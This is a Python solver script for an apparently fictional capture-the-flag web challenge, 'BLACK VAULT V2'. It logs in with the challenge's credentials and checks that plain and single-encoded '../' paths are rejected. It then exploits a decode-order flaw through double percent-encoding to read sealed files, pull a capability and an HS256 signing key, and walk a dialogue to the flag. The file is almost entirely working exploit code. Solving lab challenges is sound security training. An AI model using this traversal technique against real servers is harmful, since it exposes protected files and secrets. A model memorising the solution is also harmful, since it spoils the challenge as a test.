#!/usr/bin/env python3
"""Black-box solver for VANTA//SYSTEMS — BLACK VAULT V2.

Pipeline:
  1. Authenticate as the archivist operator (session + CSRF).
  2. Read a public document through the Document Renderer.
  3. Confirm the direct and single-encoded traversals are rejected.
  4. Exploit the validate-before-decode defect (double percent-encoding) to
     read sealed/manifest.json, then follow the manifest paths.
  5. Recover the diagnostic capability and run the full MIRA bridge dialogue.
  6. Collect the flag from the final attestation and validate the ROOT-AUDIT key.

No Docker access, no hardcoded flag, no hardcoded signing secret.
Exit code 0 only on a complete, verified solve.
"""

import argparse
import base64
import json
import re
import sys
from urllib.parse import quote

import requests

ARCHIVE_REF = "BV-2147-1057"
ALLOCATION_REF = "NG-R-1057"
USERNAME = "archivist.bv-021"
PASSWORD = "BV-021-2147"
FLAG_RE = re.compile(r"FPS\{[^}]+\}")


class SolveError(RuntimeError):
    pass


def log(step, message):
    print(f"[{step}] {message}")


def double_encode(reference):
    """Percent-encode once, then encode the percent signs again.

    The Vault Access Controller validates the value Flask already decoded once;
    the separately defined Document Renderer then calls unquote() a second time.
    Their incompatible representation contracts mean a doubly-encoded reference
    survives the naive '..'/separator check and only turns into a real parent
    traversal once the renderer decodes it.
    """
    once = quote(reference, safe="")
    return once.replace("%", "%25")


class VaultClient:
    def __init__(self, base_url, timeout):
        self.base = base_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.csrf = None

    def _url(self, path):
        return f"{self.base}{path}"

    def _grab_csrf(self, html, attr):
        match = re.search(rf'name="{attr}" (?:value|content)="([^"]+)"', html)
        if not match:
            raise SolveError("CSRF token not found in page")
        return match.group(1)

    def login(self):
        page = self.session.get(self._url("/login"), timeout=self.timeout)
        page.raise_for_status()
        token = self._grab_csrf(page.text, "csrf_token")
        resp = self.session.post(
            self._url("/login"),
            data={"csrf_token": token, "username": USERNAME, "password": PASSWORD},
            allow_redirects=False,
            timeout=self.timeout,
        )
        if resp.status_code != 303:
            raise SolveError(f"Login failed (status {resp.status_code})")
        home = self.session.get(self._url("/"), timeout=self.timeout)
        if home.status_code != 200:
            raise SolveError("Authenticated dashboard unreachable")
        log("auth", f"logged in as {USERNAME}; server session established")

    def search(self):
        resp = self.session.get(
            self._url("/archives"), params={"q": ARCHIVE_REF}, timeout=self.timeout
        )
        resp.raise_for_status()
        if ARCHIVE_REF not in resp.text:
            raise SolveError("Archive reference not discoverable from the portal")
        log("search", f"archive {ARCHIVE_REF} located from the portal")

    def preview_raw(self, encoded_file):
        """Send file= exactly as given, without any client-side re-encoding."""
        url = self._url(f"/api/vault/{ARCHIVE_REF}/preview?file={encoded_file}")
        resp = self.session.get(url, timeout=self.timeout)
        try:
            body = resp.json()
        except ValueError:
            body = {"raw": resp.text}
        return resp.status_code, body

    def read_public(self, filename):
        status, body = self.preview_raw(quote(filename, safe=""))
        if status != 200 or not body.get("ok"):
            raise SolveError(f"Public read of {filename} failed (status {status})")
        return body["content"]

    def read_sealed(self, relative_to_sealed):
        reference = f"../sealed/{relative_to_sealed}"
        status, body = self.preview_raw(double_encode(reference))
        if status != 200 or not body.get("ok"):
            raise SolveError(
                f"Sealed read of {relative_to_sealed} failed (status {status}, body {body})"
            )
        return body["content"]

    def expect_rejected(self, label, encoded_file):
        status, body = self.preview_raw(encoded_file)
        if status != 403 or body.get("error") != "PATH_REFERENCE_REJECTED":
            raise SolveError(
                f"{label} should be rejected with 403/PATH_REFERENCE_REJECTED, "
                f"got {status}/{body.get('error')}"
            )
        log("traversal", f"{label} correctly rejected ({status}/{body['error']})")

    def bridge_csrf(self):
        page = self.session.get(self._url("/diagnostics"), timeout=self.timeout)
        page.raise_for_status()
        self.csrf = self._grab_csrf(page.text, "csrf-token")

    def _post_json(self, path, payload):
        resp = self.session.post(
            self._url(path),
            json=payload,
            headers={"X-CSRF-Token": self.csrf},
            timeout=self.timeout,
        )
        try:
            body = resp.json()
        except ValueError:
            body = {"raw": resp.text}
        return resp.status_code, body

    def bridge_open(self, capability):
        status, body = self._post_json(
            "/api/bridge/open",
            {
                "archive_ref": ARCHIVE_REF,
                "allocation_ref": ALLOCATION_REF,
                "capability": capability,
            },
        )
        if status != 200 or not body.get("ok"):
            raise SolveError(f"Bridge open failed (status {status}, body {body})")
        if "attestation" in body or FLAG_RE.search(json.dumps(body)):
            raise SolveError("Flag leaked before dialogue completion")
        return body

    def bridge_advance(self, session_id, response_id):
        status, body = self._post_json(
            "/api/bridge/advance", {"session_id": session_id, "response_id": response_id}
        )
        if status != 200 or not body.get("ok"):
            raise SolveError(f"Bridge advance failed (status {status}, body {body})")
        return body


def run_dialogue(client, capability):
    client.bridge_csrf()
    view = client.bridge_open(capability)
    session_id = view["session_id"]
    log("bridge", "diagnostic channel opened; walking the scripted dialogue")
    guard = 0
    while view.get("choices"):
        guard += 1
        if guard > 10:
            raise SolveError("Dialogue did not terminate")
        response_id = view["choices"][0]["id"]
        view = client.bridge_advance(session_id, response_id)
    if view.get("state") != "completed" or "attestation" not in view:
        raise SolveError("Dialogue ended without an attestation")
    return session_id, view["attestation"]


def validate_root_audit(material):
    expected = {
        "service": "VANTA-ROOT-AUDIT",
        "algorithm": "HS256",
        "kid": "root-audit-2147",
        "secret_encoding": "base64url-no-padding",
    }
    for key, value in expected.items():
        if material.get(key) != value:
            raise SolveError(f"ROOT-AUDIT field {key} mismatch: {material.get(key)!r}")
    secret = material.get("secret_b64u", "")
    if not re.fullmatch(r"[A-Za-z0-9_-]{43}", secret):
        raise SolveError("ROOT-AUDIT secret is not 43 Base64URL chars")
    raw = base64.urlsafe_b64decode(secret + "=")
    if len(raw) != 32:
        raise SolveError(f"ROOT-AUDIT secret decodes to {len(raw)} bytes, expected 32")
    canonical = base64.urlsafe_b64encode(raw).decode().rstrip("=")
    if canonical != secret:
        raise SolveError("ROOT-AUDIT secret is not canonical Base64URL")
    return len(raw)


def solve(base_url, timeout):
    client = VaultClient(base_url, timeout)

    client.login()
    client.search()

    summary = client.read_public("summary.txt")
    if ARCHIVE_REF not in summary:
        raise SolveError("summary.txt did not contain the archive reference")
    log("read", "public summary.txt read through the Document Renderer")

    client.expect_rejected("direct ../", quote("../sealed/manifest.json", safe=""))
    client.expect_rejected(
        "single-encoded ../", "%2e%2e%2fsealed%2fmanifest.json"
    )

    manifest = json.loads(client.read_sealed("manifest.json"))
    entries = {entry["id"]: entry["path"] for entry in manifest["entries"]}
    log("exploit", f"sealed/manifest.json read via double-encoding; entries: {sorted(entries)}")

    report = client.read_sealed(entries["NG-1057-AUDIT"])
    if "NEUROGRID" not in report:
        raise SolveError("NEUROGRID report missing expected content")
    if FLAG_RE.search(report):
        raise SolveError("Flag unexpectedly present in the NEUROGRID report")
    log("exploit", "NEUROGRID report recovered (no flag inside, as expected)")

    bridge_access = json.loads(client.read_sealed(entries["NG-1057-BRIDGE"]))
    capability = bridge_access["capability"]
    log("exploit", "diagnostic capability recovered from the sealed bridge document")

    material = json.loads(client.read_sealed(entries["RT-RECOVERY"]))
    size = validate_root_audit(material)
    log("root-audit", f"ROOT-AUDIT HS256 key validated ({size} bytes, canonical Base64URL)")

    _, attestation = run_dialogue(client, capability)
    flag = attestation.get("proof", "")
    if not FLAG_RE.fullmatch(flag):
        raise SolveError(f"Attestation proof is not a valid flag: {flag!r}")
    log("flag", f"attestation flag obtained: {flag}")

    return flag


def main():
    parser = argparse.ArgumentParser(description="BLACK VAULT V2 black-box solver")
    parser.add_argument(
        "--url", default="http://127.0.0.1:8083", help="public base URL of the challenge"
    )
    parser.add_argument("--timeout", type=float, default=10.0, help="per-request timeout (s)")
    args = parser.parse_args()

    try:
        flag = solve(args.url, args.timeout)
    except (SolveError, requests.RequestException, KeyError, ValueError) as error:
        print(f"[FAIL] {error}", file=sys.stderr)
        return 1

    print("\n[SUCCESS] BLACK VAULT V2 solved end-to-end.")
    print(f"FLAG: {flag}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
